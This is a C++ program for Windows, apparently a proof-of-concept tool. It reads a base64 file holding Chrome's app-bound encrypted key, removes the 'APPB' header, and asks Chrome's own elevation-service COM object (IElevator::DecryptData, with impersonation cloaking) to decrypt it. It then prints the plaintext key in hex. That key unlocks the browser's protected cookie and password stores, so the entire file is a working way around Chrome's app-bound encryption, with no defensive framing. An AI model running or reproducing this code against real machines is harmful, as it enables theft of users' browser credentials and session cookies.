#include <Windows.h>
#include <wrl/client.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <vector>
#include <string>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "comsuppw.lib")

// https://github.com/chromium/chromium/blob/225f82f8025e4f93981310fd33daa71dc972bfa9/chrome/elevation_service/elevation_service_idl.idl
const CLSID CLSID_Elevator = { 0X708860E0, 0XF641, 0X4611, {0X88, 0X95, 0X7D, 0X86, 0X7D, 0XD3, 0X67, 0X5B} };
const IID IID_IElevator = { 0X463ABECF, 0X410D, 0X407F, {0X8A, 0XF5, 0XD, 0XF3, 0X5A, 0X0, 0X5C, 0XC8} };

typedef
enum ProtectionLevel
{
    PROTECTION_NONE = 0,
    PROTECTION_PATH_VALIDATION_OLD = 1,
    PROTECTION_PATH_VALIDATION = 2,
    PROTECTION_MAX = 3
} 	ProtectionLevel;

MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IElevator : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
        /* [string][in] */ const WCHAR * crx_path,
        /* [string][in] */ const WCHAR * browser_appid,
        /* [string][in] */ const WCHAR * browser_version,
        /* [string][in] */ const WCHAR * session_id,
        /* [in] */ DWORD caller_proc_id,
        /* [out] */ ULONG_PTR * proc_handle) = 0;

    virtual HRESULT STDMETHODCALLTYPE EncryptData(
        /* [in] */ ProtectionLevel protection_level,
        /* [in] */ const BSTR plaintext,
        /* [out] */ BSTR* ciphertext,
        /* [out] */ DWORD* last_error) = 0;

    // https://github.com/chromium/chromium/blob/225f82f8025e4f93981310fd33daa71dc972bfa9/chrome/elevation_service/elevator.cc#L155
    virtual HRESULT STDMETHODCALLTYPE DecryptData(
        /* [in] */ const BSTR ciphertext,
        /* [out] */ BSTR* plaintext,
        /* [out] */ DWORD* last_error) = 0;

};

const uint8_t kCryptAppBoundKeyPrefix[] = { 'A', 'P', 'P', 'B' };

static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

inline bool is_base64(unsigned char c) {
    return (isalnum(c) || (c == '+') || (c == '/'));
}

std::vector<uint8_t> base64_decode(const std::string& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0, j = 0, in_ = 0;
    uint8_t char_array_4[4], char_array_3[3];
    std::vector<uint8_t> decoded_data;

    while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++) {
                char_array_4[i] = base64_chars.find(char_array_4[i]);
            }
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; i < 3; i++) {
                decoded_data.push_back(char_array_3[i]);
            }
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++) {
            char_array_4[j] = 0;
        }
        for (j = 0; j < 4; j++) {
            char_array_4[j] = base64_chars.find(char_array_4[j]);
        }
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; j < i - 1; j++) {
            decoded_data.push_back(char_array_3[j]);
        }
    }

    return decoded_data;
}

std::vector<uint8_t> RetrieveEncryptedKey(const std::string& filepath) {
    std::ifstream file(filepath);
    if (!file.is_open()) {
        std::cerr << "Error: Could not find the key file." << std::endl;
        exit(EXIT_FAILURE);
    }

    std::string base64_encrypted_key((std::istreambuf_iterator<char>(file)),
        std::istreambuf_iterator<char>());

    std::vector<uint8_t> encrypted_key_with_header = base64_decode(base64_encrypted_key);

    if (!std::equal(std::begin(kCryptAppBoundKeyPrefix),
        std::end(kCryptAppBoundKeyPrefix),
        encrypted_key_with_header.begin())) {
        std::cerr << "Error: Invalid key header." << std::endl;
        exit(EXIT_FAILURE);
    }

    return std::vector<uint8_t>(encrypted_key_with_header.begin() + sizeof(kCryptAppBoundKeyPrefix),
        encrypted_key_with_header.end());
}

std::string VectorTostring(const std::vector<uint8_t>& vec)
{
    std::stringstream result;
    for (const auto& v : vec)
    {
        result
            << std::setfill('0') << std::setw(sizeof(v) * 2)
            << std::hex << +v;
    }
    return result.str();
}

// https://github.com/chromium/chromium/blob/67975166cf99a9e7f7354a259bf672a65f0b9968/chrome/browser/os_crypt/app_bound_encryption_provider_win.cc#L92
// https://github.com/chromium/chromium/blob/225f82f8025e4f93981310fd33daa71dc972bfa9/chrome/browser/os_crypt/app_bound_encryption_win.cc#L140

int main() {
    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        std::cerr << "Failed to initialize COM." << std::endl;
        return -1;
    }

    Microsoft::WRL::ComPtr<IElevator> elevator;
    DWORD last_error = ERROR_GEN_FAILURE;

    hr = CoCreateInstance(CLSID_Elevator, nullptr, CLSCTX_LOCAL_SERVER, IID_IElevator, (void**)&elevator);
    if (FAILED(hr)) {
        std::cerr << "Failed to create IElevator instance." << std::endl;
        CoUninitialize();
        return -1;
    }

    hr = CoSetProxyBlanket(
        elevator.Get(),
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr,
        EOAC_DYNAMIC_CLOAKING
    );

    if (FAILED(hr)) {
        std::cerr << "Failed to set proxy blanket." << std::endl;
        CoUninitialize();
        return -1;
    }

    const std::string filepath = "app_bound_encrypted_key.txt";
    std::vector<uint8_t> encrypted_key = RetrieveEncryptedKey(filepath);

    BSTR ciphertext_data = SysAllocStringByteLen(reinterpret_cast<const char*>(encrypted_key.data()), encrypted_key.size());
    if (!ciphertext_data) {
        std::cerr << "Failed to allocate BSTR for encrypted key." << std::endl;
        CoUninitialize();
        return -1;
    }

    BSTR plaintext_data = nullptr;
    hr = elevator->DecryptData(ciphertext_data, &plaintext_data, &last_error);

    if (SUCCEEDED(hr)) {
        std::wstring decrypted_wstring(plaintext_data, SysStringLen(plaintext_data));
        SysFreeString(plaintext_data);
        std::vector<uint8_t> encrypted_key(decrypted_wstring.begin(), decrypted_wstring.end());
        std::cout << "Decrypted key: " << VectorTostring(encrypted_key) << std::endl;
    }
    else {
        std::cerr << "Decryption failed. Last error: " << last_error << std::endl;
    }

    SysFreeString(ciphertext_data);
    CoUninitialize();
    return 0;
}
